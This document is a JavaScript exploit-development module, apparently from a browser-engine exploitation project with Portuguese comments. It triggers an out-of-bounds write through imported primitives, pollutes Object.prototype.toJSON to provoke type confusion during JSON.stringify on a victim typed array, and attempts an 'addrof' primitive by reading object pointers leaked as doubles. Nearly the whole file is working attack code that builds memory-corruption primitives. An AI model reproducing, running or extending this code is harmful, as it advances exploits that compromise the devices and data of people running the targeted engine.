// js/script3/testArrayBufferVictimCrash.mjs (v39_ControlFlowObject)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO = "OriginalHeisenbug_TypedArrayAddrof_v39_ControlFlowObject";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v39 = null;
let object_to_leak_B_v39 = null;
let victim_typed_array_ref_v39 = null;
let probe_call_count_v39 = 0;
let all_probe_interaction_details_v39 = [];
let first_call_details_object_ref_v39 = null;

const PROBE_CALL_LIMIT_V39 = 5;

function toJSON_TA_Probe_ControlFlowObject() {
    probe_call_count_v39++;
    const call_num = probe_call_count_v39;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v39_ControlFlowObject",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v39),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v39 && first_call_details_object_ref_v39 !== null),
        controlled_array_assigned: false, // Flag para indicar se o array controlado foi atribuído
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V39) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v39.push(current_call_details);
            return { recursion_stopped_v39: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v39 = current_call_details; // Global aponta para C1_details
            all_probe_interaction_details_v39.push(current_call_details);
            return current_call_details;
        } else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign controlled array...`, "vuln");

            // --- Atribuir um Float64Array com os objetos a vazar ---
            if (object_to_leak_A_v39 && object_to_leak_B_v39) {
                try {
                    let controlled_array_buffer = new ArrayBuffer(256); // Buffer suficiente para alguns elementos
                    let controlled_float64_view = new Float64Array(controlled_array_buffer);

                    // Atribuir os objetos a vazar para os índices da Float64Array.
                    // A esperança é que, se a type confusion afetar a serialização desta TypedArray,
                    // ela possa vazar os ponteiros como doubles.
                    controlled_float64_view[0] = object_to_leak_A_v39;
                    controlled_float64_view[1] = object_to_leak_B_v39;

                    this.controlled_array_ref = controlled_float64_view; // Atribui a TypedArray ao objeto C1_details
                    current_call_details.controlled_array_assigned = true;
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned controlled_float64_view to C1_details. Indices 0 and 1 set to leak targets.`, "info");
                } catch (e) {
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Error assigning controlled array: ${e.message}`, "warn");
                }
            }

            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");

            all_probe_interaction_details_v39.push(current_call_details);
            return this; // Retornar o 'this' modificado (C1_details modificado)
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected or not confused as C1_details. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v39.push(current_call_details);
            return { generic_marker_v39: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        all_probe_interaction_details_v39.push(current_call_details);
        return { error_marker_v39: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_ControlFlowObject() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (ControlFlowObject) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO} Init...`;

    probe_call_count_v39 = 0;
    all_probe_interaction_details_v39 = [];
    victim_typed_array_ref_v39 = null;
    first_call_details_object_ref_v39 = null;
    object_to_leak_A_v39 = { marker_A_v39: "LeakMeA_CFO", idA: Date.now() };
    object_to_leak_B_v39 = { marker_B_v39: "LeakMeB_CFO", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null;
    let details_of_C1_call_after_modification = null;

    let addrof_A = { success: false, msg: "Addrof A from controlled array: Default" };
    let addrof_B = { success: false, msg: "Addrof B from controlled array: Default" };
    const fillPattern = 0.39393939393939;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v39 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v39.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v39 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ControlFlowObject, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v39)...`, "info", FNAME_CURRENT_TEST);
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v39);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            if (first_call_details_object_ref_v39) {
                // Capturar uma cópia do C1_details como ele aparece DEPOIS das modificações.
                // Isso pode causar um circular structure error se o controlled_array_ref for circular.
                try {
                    details_of_C1_call_after_modification = JSON.parse(JSON.stringify(first_call_details_object_ref_v39));
                } catch (e_circular) {
                    logS3(`  Warning: Could not capture C1_details snapshot due to circular reference: ${e_circular.message}`, "warn", FNAME_CURRENT_TEST);
                    details_of_C1_call_after_modification = { snapshot_error: e_circular.message };
                }
            }
            logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls: ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v39.find(d => d.call_number === 2);
            if (call2Details && call2Details.this_is_C1_details_obj && call2Details.controlled_array_assigned) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG & CONTROLLED ARRAY ATTEMPT on C1_details CONFIRMED by probe Call #2!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Controlled Array Attempt on C1_details NOT confirmed as expected by probe Call #2.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed for leaked payloads from controlled array...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.call_number === 1) { // Verifica se é o C1_details original
                const controlled_arr = stringifyOutput_parsed.controlled_array_ref;
                if (Array.isArray(controlled_arr) || controlled_arr instanceof Float64Array || controlled_arr instanceof Uint32Array) {
                    logS3(`  Found controlled_array_ref in stringifyOutput_parsed. Type: ${Object.prototype.toString.call(controlled_arr)}. Length: ${controlled_arr.length}`, "info");

                    const val_A = controlled_arr[0];
                    if (typeof val_A === 'number' && val_A !== 0 && !isNaN(val_A)) {
                        let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
                        if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                            addrof_A.success = true; addrof_A.msg = `Possible pointer for object_to_leak_A_v39: ${pA_int64.toString(true)}`;
                        } else { addrof_A.msg = `Controlled array[0] is num but not ptr: ${val_A}`; }
                    } else if (val_A && val_A.marker_A_v39 === object_to_leak_A_v39.marker_A_v39) {
                        addrof_A.msg = `Controlled array[0] contains object_to_leak_A_v39 directly (not numeric pointer).`;
                    } else { addrof_A.msg = `Controlled array[0] not a useful number or object: ${JSON.stringify(val_A)}`; }

                    const val_B = controlled_arr[1];
                    if (typeof val_B === 'number' && val_B !== 0 && !isNaN(val_B)) {
                        let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
                        if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000 || (pB_int64.high() & 0xFF000000) === 0x80000000) {
                            addrof_B.success = true; addrof_B.msg = `Possible pointer for object_to_leak_B_v39: ${pB_int64.toString(true)}`;
                        } else { addrof_B.msg = `Controlled array[1] is num but not ptr: ${val_B}`; }
                    } else if (val_B && val_B.marker_B_v39 === object_to_leak_B_v39.marker_B_v39) {
                        addrof_B.msg = `Controlled array[1] contains object_to_leak_B_v39 directly (not numeric pointer).`;
                    } else { addrof_B.msg = `Controlled array[1] not a useful number or object: ${JSON.stringify(val_B)}`; }

                } else {
                    addrof_A.msg = `stringifyOutput.controlled_array_ref not a valid array or typed array. Type: ${Object.prototype.toString.call(controlled_arr)}`;
                    addrof_B.msg = `stringifyOutput.controlled_array_ref not a valid array or typed array. Type: ${Object.prototype.toString.call(controlled_arr)}`;
                }
            } else {
                addrof_A.msg = "stringifyOutput was not the expected C1_details object or controlled_array_ref not found.";
                addrof_B.msg = "stringifyOutput was not the expected C1_details object or controlled_array_ref not found.";
                logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}: Addr SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V39_CFO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v39}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v39 = null;
        all_probe_interaction_details_v39 = [];
        probe_call_count_v39 = 0;
        first_call_details_object_ref_v39 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        toJSON_details: details_of_C1_call_after_modification,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v39],
        total_probe_calls: probe_call_count_v39,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
